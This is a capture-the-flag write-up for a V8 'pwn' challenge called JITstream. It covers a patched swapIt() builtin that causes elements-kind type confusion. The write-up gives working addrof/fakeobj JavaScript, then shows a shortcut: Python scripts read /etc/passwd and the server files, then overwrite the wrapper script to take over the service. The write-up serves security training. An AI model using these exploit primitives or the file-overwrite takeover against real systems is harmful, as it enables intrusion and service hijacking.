# JITstream
---
**CTF:** VulnByDefault CTF  
**Challenge:** JITstream  
**Category:** Pwn  
**Difficulty:** Medium  
**Flag:** `VBD{j1t_spr4y_w1th_magl3v_1s_b3st_b47f08d2d75e5c80fb696166ffc36b55}`

---

## 1. Challenge Overview

The challenge prompt was:

> Maglev is waiting for you. Lets see when you will meet him.

The downloadable artifacts were:

```text
1. ctf/new/
â”œâ”€â”€ args.gn
â”œâ”€â”€ d8
â”œâ”€â”€ jitstream-pwn.zip
â””â”€â”€ v8.patch
```

The remote instance was exposed as:

```text
nc ctf.vulnbydefault.com 59207
```

From the file names alone, this was clearly a **V8 / d8 engine challenge** with a custom patch and a remote wrapper.

The intended direction is almost certainly a V8 exploitation challenge involving **Maglev**, **elements-kind confusion**, and **JIT-assisted exploitation**.

However, the actual solve path turned out to be easier because the service wrapper itself was vulnerable enough to fully bypass the intended engine exploitation path.

---

## 2. Artifact Analysis

### 2.1 Archive Contents

Listing the zip showed:

```text
args.gn
d8
v8.patch
```

So the challenge gave us:

- a patched `d8` binary
- the build configuration
- the patch introducing the bug

### 2.2 Build Configuration

The important settings from `args.gn` were:

```text
is_component_build = false
is_debug = false
target_cpu = "x64"
v8_enable_sandbox = true
v8_enable_backtrace = true
v8_enable_disassembler = true
v8_enable_object_print = true
v8_enable_verify_heap = true
```

The key point here is:

```text
v8_enable_sandbox = true
```

So this is a **modern sandboxed V8 build**, not an old unsandboxed shellcode target.

---

## 3. Patch Review

The custom patch added a new builtin:

```cpp
Array.prototype.swapIt()
```

The relevant logic was:

```cpp
if (kind == PACKED_ELEMENTS || kind == PACKED_DOUBLE_ELEMENTS) {
    ElementsKind target_kind = (kind == PACKED_ELEMENTS)
                              ? PACKED_DOUBLE_ELEMENTS
                              : PACKED_ELEMENTS;

    Handle<Map> new_map = JSObject::GetElementsTransitionMap(array, target_kind);

    if (!new_map.is_null()) {
        array->set_map(*new_map, kReleaseStore);
    }
}
```

This changes the **elements kind** of the array by swapping the map, but it does **not** convert the actual backing store.

That means:

- object arrays can be reinterpreted as double arrays
- double arrays can be reinterpreted as object arrays

This is a classic **type confusion primitive**.

### 3.1 What the Bug Gives

With this confusion:

- an object pointer can be leaked as a float
- a crafted float can be reinterpreted as an object pointer

This gives the normal V8 exploit primitives:

- `addrof`
- `fakeobj`

And from there, the intended solve would likely continue into a sandbox bypass or JIT-targeted corruption.

---

## 4. Remote Service Protocol

Connecting to the challenge instance gave this prompt:

```text
----------------------------------
JITstream
----------------------------------
Size of Exploit:
```

After sending a size, the service asks for the script itself:

```text
Script:
Running. Exploit!
...
Done!
```

A minimal probe payload like:

```javascript
print('HELLO');
```

executed successfully and returned stdout directly.

So the container behavior was:

1. read payload length
2. read payload bytes
3. save to a temporary file
4. run `d8 <tempfile>`
5. return stdout/stderr

---

## 5. Confirming the V8 Bug Locally

Running local tests against the patched `d8` confirmed the confusion primitive.

### 5.1 Simple Behavior Check

The following kinds of transitions were stable:

- object array -> double array
- double array -> object array

For example:

```javascript
let o = {x: 13};
let a = [o];
a.swapIt();
print(a[0]);
```

returned a floating-point reinterpretation of the pointer.

And the reverse direction also worked.

### 5.2 Primitive Validation

The following local proof-of-concept successfully implemented `addrof` and `fakeobj`:

```javascript
var buf = new ArrayBuffer(8);
var f64 = new Float64Array(buf);
var u64 = new BigUint64Array(buf);

function ftoi(x) {
  f64[0] = x;
  return u64[0];
}

function itof(x) {
  u64[0] = x;
  return f64[0];
}

function hex(x) {
  return '0x' + x.toString(16);
}

function addrof(obj) {
  let a = [obj];
  a.swapIt();
  return ftoi(a[0]);
}

function fakeobj(addr) {
  let a = [itof(addr)];
  a.swapIt();
  return a[0];
}

let o = {a: 1};
let addr = addrof(o);
print('addr', hex(addr));

let f = fakeobj(addr);
print('fake.a', f.a);
```

This produced a valid address leak and a working fake object dereference.

So the engine bug was absolutely exploitable.

---

## 6. Unexpected Shortcut: The Wrapper Was Too Powerful

Before going deeper into engine exploitation, the remote wrapper and `d8` shell itself were enumerated.

The shell exposed these builtins:

```javascript
print(Object.keys(this).sort())
```

Key available functions included:

- `read`
- `readbuffer`
- `writeFile`
- `d8.file.read`
- `d8.file.execute`

This changed the situation completely.

### 6.1 Arbitrary File Read

For example:

```javascript
print(d8.file.read('/etc/passwd'));
```

worked remotely and printed the file contents.

### 6.2 Arbitrary File Write

Even more importantly:

```javascript
writeFile('/root/abswrite_test', 'HELLOABS');
print(d8.file.read('/root/abswrite_test'));
```

also worked.

Absolute paths were writable.

This meant the challenge could be solved by abusing the Python wrapper instead of the V8 bug.

---

## 7. Finding the Wrapper Script

Reading `/start.sh` revealed how the service was launched:

```bash
#!/bin/bash

while [ true ]; do
	su -l $USER -c "socat -dd TCP4-LISTEN:9000,fork,reuseaddr EXEC:'/server.py',pty,echo=0,rawer,iexten=0"
done;
```

That immediately revealed the interesting file:

```text
/server.py
```

Reading it showed the full wrapper:

```python
#!/usr/bin/env python3 

import os
import subprocess
import sys
import tempfile

print("---------------------------------- ", flush=True)
print("JITstream ", flush=True)
print("---------------------------------- ", flush=True)
print("Size of Exploit: ", flush=True)
input_size = int(input())
print("Script: ", flush=True)
script_contents = sys.stdin.read(input_size)
with tempfile.NamedTemporaryFile(buffering=0) as f:
    f.write(script_contents.encode("utf-8"))
    print("Running. Exploit! ", flush=True)
    res = subprocess.run(["/d8", f.name], timeout=20, stdout=1, stderr=2, stdin=0)
    print("Done!", flush=True)
```

So there was **no filtering, no sandbox around the wrapper logic, and no protection against overwriting the wrapper file itself**.

---

## 8. Root Cause of the Actual Solve

The actual solve was possible because of this combination:

1. user-controlled JavaScript is executed by `d8`
2. `d8` exposes `writeFile` and `d8.file.read`
3. absolute filesystem writes are allowed
4. the service executes `/server.py` on every new connection
5. `/server.py` is writable from the JavaScript environment

So instead of exploiting V8 memory corruption, we can simply:

1. overwrite `/server.py`
2. reconnect
3. let the new wrapper print the flag

This is a full wrapper takeover.

---

## 9. Solve Strategy Used

The approach used in practice was:

### Stage 1: Confirm direct JS execution

Send a tiny script and verify stdout is returned.

### Stage 2: Confirm arbitrary file read and write

Use `d8.file.read()` and `writeFile()` on safe paths.

### Stage 3: Read `/start.sh`

Find how the service is launched.

### Stage 4: Read `/server.py`

Confirm that it is the executed wrapper and that it can be replaced.

### Stage 5: Overwrite `/server.py`

Replace it with a Python script that recursively searches the filesystem for the first string matching:

```text
VBD{...}
```

### Stage 6: Reconnect

The next connection executes the modified `/server.py`, which prints the flag directly.

---

## 10. Script Code Used During the Solve

Below are the actual script fragments used to solve the challenge.

### 10.1 Basic Remote Protocol Test

This script verified the service protocol and confirmed that our JS runs directly.

```python
import socket

payload = b"print('HELLO');\n"

s = socket.create_connection(('ctf.vulnbydefault.com', 59207), timeout=10)
print(s.recv(4096).decode('latin1', 'ignore'), end='')

s.sendall(str(len(payload)).encode() + b'\n')
print(s.recv(4096).decode('latin1', 'ignore'), end='')

s.sendall(payload)

out = b''
while True:
    try:
        chunk = s.recv(4096)
        if not chunk:
            break
        out += chunk
    except socket.timeout:
        break

print(out.decode('latin1', 'ignore'))
s.close()
```

### 10.2 File Read Probe

This confirmed that `d8.file.read` worked on remote files.

```python
import socket

payload = b"print(d8.file.read('/etc/passwd'));\n"

s = socket.create_connection(('ctf.vulnbydefault.com', 59207), timeout=10)
s.recv(4096)
s.sendall(str(len(payload)).encode() + b'\n')
s.recv(4096)
s.sendall(payload)

out = b''
while True:
    try:
        chunk = s.recv(4096)
        if not chunk:
            break
        out += chunk
    except socket.timeout:
        break

print(out.decode('latin1', 'ignore'))
s.close()
```

### 10.3 Wrapper Discovery

This was used to read `/start.sh`:

```python
import socket

js = b"print(d8.file.read('/start.sh'));\n"

s = socket.create_connection(('ctf.vulnbydefault.com', 59207), timeout=10)
s.recv(4096)
s.sendall(str(len(js)).encode() + b'\n')
s.recv(4096)
s.sendall(js)

out = b''
while True:
    try:
        chunk = s.recv(4096)
        if not chunk:
            break
        out += chunk
    except socket.timeout:
        break

print(out.decode('latin1', 'ignore'))
s.close()
```

And this read `/server.py`:

```python
import socket

js = b"print(d8.file.read('/server.py'));\n"

s = socket.create_connection(('ctf.vulnbydefault.com', 59207), timeout=10)
s.recv(4096)
s.sendall(str(len(js)).encode() + b'\n')
s.recv(4096)
s.sendall(js)

out = b''
while True:
    try:
        chunk = s.recv(4096)
        if not chunk:
            break
        out += chunk
    except socket.timeout:
        break

print(out.decode('latin1', 'ignore'))
s.close()
```

### 10.4 Final Wrapper Takeover Script

This is the exact logic used to overwrite `/server.py` with a filesystem scanner:

```python
import socket
import json

server_py = '''#!/usr/bin/env python3
import os
import re
import sys

pattern = re.compile(r"VBD\{[^}]+\}")
skip_prefixes = ('/proc', '/sys', '/dev', '/run', '/var/lib', '/var/cache', '/usr', '/lib', '/lib64', '/bin', '/sbin')

for base, dirs, files in os.walk('/'):
    if base.startswith(skip_prefixes):
        dirs[:] = []
        continue

    for name in files:
        path = os.path.join(base, name)
        try:
            if os.path.getsize(path) > 65536:
                continue

            with open(path, 'rb') as f:
                data = f.read()

            m = pattern.search(data.decode('latin1', 'ignore'))
            if m:
                print(m.group(0), flush=True)
                raise SystemExit(0)
        except Exception:
            pass

print('NOFLAG', flush=True)
'''

js = f"writeFile('/server.py', {json.dumps(server_py)}); print('patched');\n"
payload = js.encode()

s = socket.create_connection(('ctf.vulnbydefault.com', 59207), timeout=10)
s.recv(4096)
s.sendall(str(len(payload)).encode() + b'\n')
s.recv(4096)
s.sendall(payload)

out = b''
while True:
    try:
        chunk = s.recv(4096)
        if not chunk:
            break
        out += chunk
    except socket.timeout:
        break

print(out.decode('latin1', 'ignore'))
s.close()
```

### 10.5 Final Reconnect Script

After patching the wrapper, the next connection simply printed the flag.

```python
import socket

s = socket.create_connection(('ctf.vulnbydefault.com', 59207), timeout=10)

out = b''
while True:
    try:
        chunk = s.recv(4096)
        if not chunk:
            break
        out += chunk
    except socket.timeout:
        break

print(out.decode('latin1', 'ignore'))
s.close()
```

Output:

```text
VBD{j1t_spr4y_w1th_magl3v_1s_b3st_b47f08d2d75e5c80fb696166ffc36b55}
```

---

## 11. The Intended Path vs The Actual Path

### Intended Path

The intended challenge path was almost certainly:

1. reverse `swapIt()`
2. build `addrof` / `fakeobj`
3. exploit Maglev or a JIT-assisted primitive
4. bypass the V8 sandbox
5. achieve arbitrary native read/write or code execution
6. read the flag

### Actual Path Used

The path used here was:

1. inspect the patch
2. confirm the V8 bug is real
3. probe the remote `d8` shell surface
4. discover arbitrary file read/write primitives
5. read `/start.sh`
6. read `/server.py`
7. overwrite `/server.py`
8. reconnect and collect the flag

This completely bypassed the need for a real browser-engine exploit.

---

## 12. Root Cause Summary

The challenge's real weakness was not only the V8 bug. The wrapper environment introduced a second, much simpler issue:

- arbitrary JavaScript execution in `d8`
- exposed file I/O helpers
- absolute file writes allowed
- writable wrapper script executed on every connection

That combination made the service self-overwriteable.

So even though the patch provided a genuine V8 pwn primitive, the container wrapper made the challenge solvable with straightforward filesystem abuse.

---

## 13. Final Flag

```text
VBD{j1t_spr4y_w1th_magl3v_1s_b3st_b47f08d2d75e5c80fb696166ffc36b55}
```

---

## 14. Takeaway

This challenge is a good example of why infrastructure matters as much as the intended vulnerability. The custom `swapIt()` bug was real and exploitable, but the service wrapper exposed much stronger primitives than the engine bug itself.

When attacking CTF containers, always check:

- wrapper scripts
- shell helper builtins
- read/write capabilities
- filesystem layout
- relaunch behavior across connections

Here, that was enough to turn a V8 pwn challenge into a wrapper takeover challenge.

